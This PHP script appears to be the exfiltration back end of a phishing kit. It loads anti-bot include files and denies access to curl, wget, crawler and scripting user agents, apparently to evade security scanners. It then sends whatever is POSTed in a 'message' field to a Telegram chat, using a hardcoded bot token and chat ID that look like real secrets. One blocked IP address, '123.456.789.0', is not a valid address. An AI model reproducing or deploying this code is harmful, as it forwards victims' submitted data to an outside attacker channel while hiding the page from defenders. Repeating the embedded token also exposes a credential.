<?php
include('prevents/anti5.php');
include('prevents/anti1.php');
include('prevents/anti8.php');
include('prevents/anti2.php');
include('prevents/anti4.php');
include('prevents/anti7.php');
include('prevents/anti3.php');


function blockSuspiciousUserAgent()
{
    $botAgents = [
        'curl',
        'wget',
        'bot',
        'crawler',
        'spider',
        'http',
        'python',
        'java'
    ];
    $userAgent = strtolower($_SERVER['HTTP_USER_AGENT']);
    foreach ($botAgents as $bot) {
        if (strpos($userAgent, $bot) !== false) {
            header("HTTP/1.1 403 Forbidden");
            exit('Access denied');
        }
    }
}

function blockSuspiciousIPs()
{
    $blockedIPs = [
        '192.168.1.1',
        '123.456.789.0',
    ];
    if (in_array($_SERVER['REMOTE_ADDR'], $blockedIPs)) {
        header("HTTP/1.1 403 Forbidden");
        exit('Access denied');
    }
}


blockSuspiciousUserAgent();
blockSuspiciousIPs();

$botToken = "7274962782:AAGi2HZlpm4EGxeoPWrLURWIApxrQls08yw";
$chatId = "-4770377680";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $message = $_POST['message'];
    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message));
}